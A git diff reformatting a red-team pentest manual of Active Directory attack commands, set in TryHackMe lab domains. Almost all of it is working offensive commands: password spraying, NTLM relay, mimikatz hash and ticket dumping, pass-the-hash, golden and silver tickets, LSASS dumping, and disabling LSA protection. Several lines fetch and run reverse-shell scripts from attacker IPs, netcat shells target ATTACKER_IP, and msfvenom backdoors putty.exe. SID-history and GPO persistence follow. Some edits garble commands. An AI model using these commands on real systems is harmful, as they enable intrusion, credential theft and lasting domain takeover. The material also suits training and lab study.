@@ -1,45 +1,42 @@
 # Red Team Manual
- ## RED TEAM INTERNAL PENTEST MANUAL (Collections of Offensive Anti-EDR / Disabler toolkit and More)
-# Enumeration
+ ### RED TEAM INTERNAL PENTEST MANUAL (Collections of Offensive Anti-EDR / Disabler toolkit and More)
+### Enumeration
 
-# Credential Injection
-
-runas.exe /netonly /user:<domain>\<username> cmd.exe
-
-
-# enumeration users
-users
+### Credential Injection
+```
+runas.exe /netonly /user:<domain>\<username> cmd.exe```
+```
+### User Enumeration
+```
 net user /domain
-
-groups
+net user <user> /domain
 net group /domain
-
-# Password Policy
+net group <user> /domain
+```
+### Password Policy
+```
 net accounts /domain
-
-# bloodhound
+```
+### bloodhound
+```
 SSharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
 sudo neo4j console 
 bloodhound --no-sandbox
-
+```
 https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
 
-
-
-
-
-
-
-
-# NTLM Authenticated Services
+### NTLM Authenticated Services
+```
 python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
+```
 
+### LDAP Bind Credentials
 
-# LDAP Bind Credentials
+### [+] LDAP Pass-back Attacks
 
-[+] LDAP Pass-back Attacks
+```
+hosting rogue ldap
 
-* hosting rogue ldap
 sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
 sudo dpkg-reconfigure -p low slapd
 
@@ -66,15 +63,15 @@ supportedSASLMechanisms: LOGIN
 
 
 sudo tcpdump -SX -i breachad tcp port 389
+```
+### Authentication Relays 
 
-
-# Authentication Relays 
-
-
-sudo responder -I breachad
+```
+sudo responder -I breached
 hashcat -m 5600 <hash file> <password file> --force
-
-# PXE
+```
+### PXE
+```
 powerpxe
 "\Tmp\x64{39...28}.bcd" conf.bcd
 
@@ -82,18 +79,19 @@ Import-Module .\PowerPXE.ps1
 $BCDFile = "conf.bcd"
 Get-WimFile -bcdFile $BCDFile
 Get-FindCredentials -WimFile pxeboot.wim
+```
 
 
 
 
+### lateral movement and pivoting
 
-# lateral movement and pivoting
-
-# Spawning Processes Remotely 
+#### Spawning Processes Remotely 
 
 Psexec (port 445)
 Required Group Memberships: Administrators
 
+```
 PsExec64.exe \\10.200.75.101 -u Administrator -p Mypass123 -i cmd.exe    
 
 
@@ -109,9 +107,9 @@ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
 Enter-PSSession -Computername TARGET -Credential $credential
 Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+```
 
-
-Remotely Creating Services Using sc
+#### Remotely Creating Services Using sc
 
     Ports:
         135/TCP, 49152-65535/TCP (DCE/RPC)
@@ -119,7 +117,7 @@ Remotely Creating Services Using sc
         139/TCP (RPC over SMB Named Pipes)
     Required Group Memberships: Administrators
 
-
+```
 create service
 sc.exe \\TARGET create THMservice binPath= "net user t1_leonard.summers  Pass123" start= auto
 sc.exe \\TARGET start THMservice
@@ -140,18 +138,16 @@ run rev shell using powershell
 sc.exe \\thmiis.za.tryhackme.com create THMservice-3243 binPath= "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.67.155/Invoke-PowerShellTcp.ps1')" start= auto
 
 sc.exe \\thmiis.za.tryhackme.com start THMservice-3243
-
-
-
-# Creating Scheduled Tasks Remotely
-
+```
+### Creating Scheduled Tasks Remotely
+```
 schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
 schtasks /s TARGET /run /TN "THMtask1" 
 schtasks /S TARGET /TN "THMtask1" /DELETE /F
+```
 
 
-
-# Moving Laterally Using WMI 
+### Moving Laterally Using WMI 
 
 WMI session using either of the following protocols:
 
@@ -170,15 +166,13 @@ $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionO
 
 ```
 
-Remote Process Creation Using WMI
-
-
+### Remote Process Creation Using WMI
 
     Ports:
         135/TCP, 49152-65535/TCP (DCERPC)
         5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
     Required Group Memberships: Administrators
-
+```
 
 $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
@@ -187,18 +181,15 @@ CommandLine = $Command
 
 wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
 
-
-Creating Services Remotely with WMI
+```
+### Creating Services Remotely with WMI
 
 
     Ports:
         135/TCP, 49152-65535/TCP (DCERPC)
         5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
     Required Group Memberships: Administrators
-
-
-
-
+```
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
 Name = "THMService2";
 DisplayName = "THMService2";
@@ -215,12 +206,10 @@ Invoke-CimMethod -InputObject $Service -MethodName StartService
 
 Invoke-CimMethod -InputObject $Service -MethodName StopService
 Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+### Creating Scheduled Tasks Remotely with WMI
 
-
-
-Creating Scheduled Tasks Remotely with WMI
-
-
+```
     Ports:
         135/TCP, 49152-65535/TCP (DCERPC)
         5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
@@ -235,13 +224,9 @@ $Args = "/c net user munra22 aSdf1234 /add"
 $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
 Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
 Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
-
-
-
-
-Installing MSI packages through WMI
-
-
+```
+### Installing MSI packages through WMI
+```
     Ports:
         135/TCP, 49152-65535/TCP (DCERPC)
         5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
@@ -251,19 +236,17 @@ Installing MSI packages through WMI
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 
 wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
-
-
-
-
-# Use of Alternate Authentication Material 
+```
+### Use of Alternate Authentication Material 
 
 Extracting NTLM hashes from local SAM
+```
 privilege::debug
 token::elevate
 lsadump::sam 
-
-Extracting NTLM hashes from LSASS memory
-
+```
+### Extracting NTLM hashes from LSASS memory
+```
 privilege::debug
 token::elevate
 sekurlsa::msv
@@ -280,40 +263,36 @@ psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
 
 Connect to WinRM using PtH
 evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+```
 
-
-Pass-the-Ticket
-
+### Pass-the-Ticket
+```
 privilege::debug
 sekurlsa::tickets /export
 kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
-
-
-Overpass-the-hash / Pass-the-Key
-
+```
+### Overpass-the-hash / Pass-the-Key
+```
 privilege::debug
 sekurlsa::ekeys
 sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
 sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
 sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+### Abusing User Behaviour 
 
-
-
-# Abusing User Behaviour 
-
-Backdooring .vbs Scripts
-
+#### Backdooring .vbs Scripts
+```
 CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
-
-Backdooring .exe Files
-
+```
+### Backdooring .exe Files
+```
 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+### RDP hijacking
 
-RDP hijacking
-
-close rdp session without logout.
-
-
+#### close rdp session without logout.
+```
 query users
 query user
 session with a Disc state has been left open 
@@ -321,36 +300,29 @@ run cmd as Administrator
 PsExec64.exe -s cmd.exe
 
 tscon 3 /dest:rdp-tcp#6
+```
 
 
+### Port Forwarding 
 
-# Port Forwarding 
-
-SSH Tunnelling
-
+#### SSH Tunnelling
+```
 ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
 ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
 netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
-
-
 ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N
-
-Port Forwarding With socat
+```
+### Port Forwarding With socat
+```
 socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
 socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
 netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
-
-
-
-Dynamic Port Forwarding and SOCKS
-
-ssh tunneluser@1.1.1.1 -R 9050 -N
-
-
-
-
-# Exploiting Permission Delegation 
-
+```
+### Dynamic Port Forwarding and SOCKS
+```
+ssh tunneluser@1.1.1.1 -R 9050 -l
+```
+### Exploiting Permission Delegation 
 
     ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
     AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
@@ -359,9 +331,7 @@ ssh tunneluser@1.1.1.1 -R 9050 -N
     WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
     WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
     AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
-
-
-
+```
  Add-ADGroupMember "IT Support" -Members "sharon.khan"
  Get-ADGroupMember -Identity "IT Support"
 
@@ -373,23 +343,22 @@ change password
  Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password 
  force update
 gpupdate /force
+```
 
 
-
-# Exploiting Kerberos Delegation 
+### Exploiting Kerberos Delegation 
 
 TRUSTED_FOR_DELEGATION flag
-
+```
 msDS-AllowedToActOnBehalfOfOtherIdentity
 
 Import-Module C:\Tools\PowerView.ps1 
 Get-NetUser -TrustedToAuth
-
-
-mimikatz
+```
+### mimikatz
+```
 token::elevate
 lsadump::secrets
-
 
 kekeo.exe
 
@@ -399,62 +368,61 @@ tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
 tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
 user - The user we want to impersonate. 
 command generate tgt 
-
-use mimikatz to inject tickets
+```
+### use mimikatz to inject tickets
+```
 privilege::debug
 kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
-
-interact with server
+```
+### interact with server
+```
 New-PSSession -ComputerName thmserver1.za.tryhackme.loc
  Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
+```
 
-
- # Exploiting Automated Relays 
+ ### Exploiting Automated Relays 
  identify  machine account has administrative access over another machine
 
-bloodhound query
+### bloodhound query
+```
  MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
+```
 
-
-The Printer Bug
-
-Print Spooler Service
+### The Printer Bug
+#### Print Spooler Service
+```
 use wmi query
 GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
 Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
-
-SMB Signing
-
+```
+### SMB Signing
+```
 nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
+```
 
-
-Exploiting Authentication Relays
-
+### Exploiting Authentication Relays
 https://github.com/leechristensen/SpoolSample
 
-
-step ntlm Relay
-
-
+### step ntlm Relay
+```
 impacket-ntlmrelayx -smb2support -t  smb://10.200.60.201 -c 'whoami /all' -debug
-
-
 impacket-ntlmrelayx -smb2support -t  smb://10.200.60.201 -c "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.67.155:81/Invoke-PowerShellTcp.ps1')" -debug
 
 SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.57.65 
-
-look for file
+```
+### look for file
+```
 Get-ChildItem -Recurse *.kdbx
+```
+### Exploiting Certificates 
 
-
-
-# Exploiting Certificates 
-
-Finding Vulnerable Certificate Templates
+#### Finding Vulnerable Certificate Templates
+```
 certutil -Template -v > templates.txt
-https://github.com/GhostPack/PSPKIAudit
 
-parameters
+https://github.com/GhostPack/PSPKIAudit
+```
+### parameters
     Client Authentication - The certificate can be used for Client Authentication.
     CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
     CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
@@ -466,7 +434,6 @@ parameters
     Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
     Click OK
 
-
         Right Click on Personal and select All Tasks->Request New Certificate...
     Click Next twice to select the AD enrollment policy.
     You will see that we have one template that we can request, but first, we need to provide additional information.
@@ -475,21 +442,13 @@ parameters
     Change the Alternative name Type option to User principal name.
     Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.
 
-
-
-
         Right-click on the certificate and select All Tasks->Export...
     Click Next, select Yes, export the private key, and click Next.
     Click Next, then set a password for the certificate since the private key cannot be exported without a password.
     Click Next and select a location to store the certificate.
     Click Next and finally click Finish.
 
-
-
-
-
-Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
-
+Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller
 
     /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
     /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
@@ -497,30 +456,33 @@ Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to cert
     /password - The password for our certificate file
     /outfile - The file where our TGT will be output to
     /domain - The FQDN of the domain we are currently attacking
-    /dc - The IP of the domain controller which we are requesting the TGT from. Usually it is best to select a DC that has a CA service running
+    /dc - The IP of the domain controller which we are requesting the TGT from. Usually it is best to select a DC that 
+
+### has a CA service running
 
 
 
-mimikatz
+### mimikatz
+```
  privilege::debug
  kerberos::ptt administrator.kirbi
+```
 
-
- create service
+ ### create service
+```
  sc.exe \\THMDC.za.tryhackme.loc create THMservice-3243 binPath= "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.57.65:81/Invoke-PowerShellTcp.ps1')" start= auto
 
 sc.exe \\THMDC.za.tryhackme.loc start THMservice-3243
+```
+### Exploiting Domain Trusts 
 
-
-
-# Exploiting Domain Trusts 
-
-dump krbtgt
+### dump krbtgt
+```
 privilege::debug
 lsadump::dcsync /user:za\krbtgt
-
-Inter-Realm TGTs
-access resource on other domain
+```
+### Inter-Realm TGTs
+### access resource on other domain
 
 Mimikatz can assist with this, allowing us to set the ExtraSids section of the KERB_VALIDATION_INFO structure of the Kerberos TGT.
 
@@ -528,42 +490,32 @@ Mimikatz can assist with this, allowing us to set the ExtraSids section of the K
 the ExtraSids section is described as “A pointer to a list of KERB_SID_AND_ATTRIBUTES structures that contain a list of SIDs corresponding to groups in domains other than the account domain to which the principal belongs”.
 
 
-SID of the Enterprise Admins (EA) group as an extra SID 
+### SID of the Enterprise Admins (EA) group as an extra SID 
 
 
 
-two SIDs:
+### two SIDs:
 
     The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT
-
+```
 Get-ADComputer -Identity "THMDC"
 
-
+```
     The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT 
-
+```
 Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
+```
 
-
-Exploiting Domain Trusts
-
+### Exploiting Domain Trusts
+```
 privilege::debug
 kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
-
-
 
 sc.exe \\thmrootdc.tryhackme.loc create THMservice-3243 binPath= "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.57.65:81/Invoke-PowerShellTcp.ps1')" start= auto
 
 sc.exe \\thmrootdc.tryhackme.loc  start THMservice-3243
-
-
-
-
-
-
-
-
-
-############## Persisting Active Directory #########
+```
+### Active Directory Persistence
 
 we should attempt to persist through credentials such as the following:
 
@@ -572,30 +524,29 @@ Service accounts that have delegation permissions. With these accounts, we would
 Accounts used for privileged AD services. If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.
 
 
-mimikatz 
+### mimikatz 
+```
  lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
  lsadump::dcsync /domain:za.tryhackme.loc /all
-
-
-
-
-
- # Persistence through Tickets
+```
+# Persistence through Tickets
+```
 get all parameters
 Get-ADDomain
-
+```
 domain name
 domain sid 
 user id 
 
 
-silver ticket
+### silver ticket
 the generated TGS is signed by the machine account of the host we are targeting.
+```
+kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of
+```
+server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
 
-
-kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
-
-    /admin - The username we want to impersonate. This does not have to be a valid user.
+    /admin - The username we want to impersonateThis does not have to be a valid user.
     /domain - The FQDN of the domain we want to generate the ticket for.
     /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
     /sid -The SID of the domain we want to generate the ticket for.
@@ -604,15 +555,10 @@ kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /
     /service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
     /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
 
-
-
-
-
-
-
-golden ticket
+### golden ticket
+```
 kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
-
+```
 /admin - The username we want to impersonate. This does not have to be a valid user.
 /domain - The FQDN of the domain we want to generate the ticket for.
 /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
@@ -622,41 +568,36 @@ kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 
 /renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
 /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
 
+### Persistence through Certificates 
 
-
-
-
-# Persistence through Certificates 
-
-
-Extracting the Private Key
+#### Extracting the Private Key
 
 Active Directory Certificate Services (AD CS) for internal purposes, it is protected by the machine Data Protection API (DPAPI)
 
-Mimikatz and SharpDPAPI 
+### Mimikatz and SharpDPAPI 
 
 mimikatz
 view the certificates stored on the DC:
-
+```
 crypto::certificates /systemstore:local_machine
-
-export keys
-
+```
+### export keys
 mimikatz
+```
 privilege::debug
 crypto::capi
 crypto::cng
 crypto::certificates /systemstore:local_machine /export
-
+```
 note:
 . In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz
 
-Generating our own Certificates
+### Generating ou own Certificates
 
 https://github.com/GhostPack/ForgeCert
-
+```
 ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
-
+```
     CaCertPath - The path to our exported CA certificate.
     CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
     Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
@@ -664,28 +605,23 @@ ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject C
     NewCertPath - The path to where ForgeCert will store the generated certificate.
     NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
 
-
-    generate tgt using certificate
-
-    Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:
-
-
+### generate tgt using certificate
+```
+ Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:
+```
     /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
     /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
     /certificate - Path to the certificate we have generated
     /password - The password for our certificate file
     /outfile - The file where our TGT will be output to
     /domain - The FQDN of the domain we are currently attacking
-    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running
+    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that 
 
-
-
-
+### has a CA service running
+```
 load ticket in memory using mimikatz
 kerberos::ptt administrator.kirbi
-
-
-
+```
 # Persistence through SID History 
 
 notes about this persistence technique:
@@ -694,30 +630,28 @@ notes about this persistence technique:
     When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
     We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
     Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.
-
-
-
-
+```
 Get-ADUser <your ad username> -properties sidhistory,memberof
 
 Get-ADGroup "Domain Admins"
-add group sid to user account
+```
+### add group sid to user account
 
 mimikatz can add sid history
 https://github.com/MichaelGrafnetter/DSInternals
-
+```
 Stop-Service -Name ntds -force
 
 Add-ADDBSidHistory -SamAccountName tony.wilson -SidHistory S-1-5-21-3885271727-2693558621-2658995185-512  -DatabasePath C:\Windows\NTDS\ntds.dit 
 
 Start-Service -Name ntds  
+```
 
 
-
-# Persistence through Group Membership 
+### Persistence through Group Membership 
 
 People->IT Organisational Unit (OU)
-
+```
 New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
 
  People->Sales OU and add our previous group as a member:
@@ -726,10 +660,10 @@ New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<usernam
 Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
 
 Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
+```
 
 
-
-# Persistence through ACLs
+### Persistence through ACLs
 
 Persisting through AD Group Templates
 AdminSDHolder container  container exists in every AD domain, and its Access Control List (ACL) is used as a template to copy permissions to all protected groups. 
@@ -738,11 +672,9 @@ Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
 
  process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes
 
-
+```
  runas /netonly /user:Administrator cmd.exe
-
-
-
+```
 Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Groups). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:
 
 
@@ -758,15 +690,12 @@ low-privileged user and grant Full Control:
     Click OK.
 
 
-SDProp
-
+### SDProp
+```
 Import-Module .\Invoke-ADSDPropagation.ps1 
 Invoke-ADSDPropagation
-
-
-
-# Persistence through GPOs 
-
+```
+### Persistence through GPOs 
 Domain Wide Persistence
 
 The following are some common GPO persistence techniques:
@@ -774,7 +703,7 @@ The following are some common GPO persistence techniques:
     Restricted Group Membership - This could allow us administrative access to all hosts in the domain
     Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. 
 
-
+```
     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
     runas /netonly /user:Administrator cmd.exe
     create admin.bat 
@@ -782,10 +711,8 @@ The following are some common GPO persistence techniques:
 
     scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
     scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
-
-
-    
-    GPO Creation
+```
+### GPO Creation
 
     The first step uses our Domain Admin account to open the Group Policy Management snap-in:
 
@@ -794,13 +721,10 @@ The following are some common GPO persistence techniques:
     Select the Group Policy Management snap-in and click Add
     Click OK
 
-
-
-# Credential Access
-
+### Credential Access
+```
 powershell history
 C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-
 
 reg query HKLM /f password /t REG_SZ /s
 eg query HKCU /f password /t REG_SZ /s
@@ -809,9 +733,8 @@ password on REG_SZ
 
 password on description
 Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
-
-
-# Local Windows Credentials 
+```
+### Local Windows Credentials 
 
 Volume Shadow Copy Service
 steps
@@ -819,35 +742,36 @@ steps
     Run the standard cmd.exe prompt with administrator privileges.
 
     Execute the wmic command to create a copy shadow of C: drive
-
+```
     wmic shadowcopy call create Volume='C:\'
+```
+### Verify the creation from step 2 is available.
+```
+vssadmin list shadows
+```
+#### Copy the SAM database from the volume we created in step 2
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
 
-    Verify the creation from step 2 is available.
+impacket-secretsdump -sam sam -system system LOCAL
+```
 
-    vssadmin list shadows
-
-    Copy the SAM database from the volume we created in step 2
-    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
-    impacket-secretsdump   -sam sam -system system LOCAL
-
-
-# Registry Hives
-
+### Registry Hives
+```
 reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
 reg save HKLM\system C:\users\Administrator\Desktop\system-reg
-
-
-# Local Security Authority Subsystem Service (LSASS)
-
+```
+### Local Security Authority Subsystem Service (LSASS)
+```
 procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
 
 .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+```
 
-
-mimikatz Protected LSASS
+### mimikatz Protected LSASS
 
 In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.
-
+```
 mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 
@@ -858,52 +782,55 @@ mimikatz # !+
 Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.
 
 mimikatz # !processprotect /process:lsass.exe /remove
+```
 
 
+### Credentials Manager
 
-# Credentials Manager
-
-There are four credential categories:
+#### There are four credential categories:
 
     Web credentials contain authentication details stored in Internet browsers or other applications.
     Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
     Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
     Certificate-based credentials: Athunticated details based on certifications.
 
-
-
-list available credentials 
+#### list available credentials 
+```
 vaultcmd /list
-
-check if credentials exists
+```
+#### check if credentials exists
+```
 VaultCmd /listproperties:"Web Credentials"
-
-
-Listing Credentials Details
+```
+#### Listing Credentials Details
+```
 VaultCmd /listcreds:"Web Credentials"
+```
 
-
-Credential Dumping
+### Credential Dumping
 https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
+```
 powershell -ex bypass
 Import-Module Get-WebCredentials.ps1
 Get-WebCredentials
-
-RunAs
+```
+#### RunAs
+```
 cmdkey /list
 runas /savecred /user:THM.red\thm-local cmd.exe
-
